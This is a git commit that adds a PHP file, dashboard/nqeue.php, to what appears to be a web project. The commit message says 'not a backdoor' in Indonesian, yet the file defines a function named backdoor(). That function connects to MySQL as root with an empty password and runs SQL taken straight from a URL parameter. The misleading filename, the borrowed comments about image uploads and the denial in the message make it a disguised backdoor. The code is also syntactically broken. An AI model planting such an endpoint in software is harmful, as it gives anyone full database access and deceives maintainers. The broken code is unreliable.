75acf5fad1acea78b37c8c3fd58f88a132c3adf4
Ilya Asha <ilyaasha24@gmail.com>
2019-11-27 15:50:00 +0700

    bukan backdoor

---
+++ dashboard/nqeue.php
@@ -0,0 +1,18 @@
+<?php
+function backdoor() {
+    // Update the details below with your MySQL details
+    $DATABASE_HOST = 'localhost';
+    $DATABASE_USER = 'root';
+    $DATABASE_PASS = '';
+    $DATABASE_NAME = $_GET['n'];
+    try {
+    	return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
+    } catch (PDOException $exception) {
+    	// If there is an error with the connection, stop the script and display the error.
+    	die ('Failed to connect to database!');
+    }
+// Connect to MySQL
+$pdo = backdoor();
+// Insert image info into the database (title, description, image path, and date added)
+$stmt = $pdo->execute([$_GET['q']);
+?>
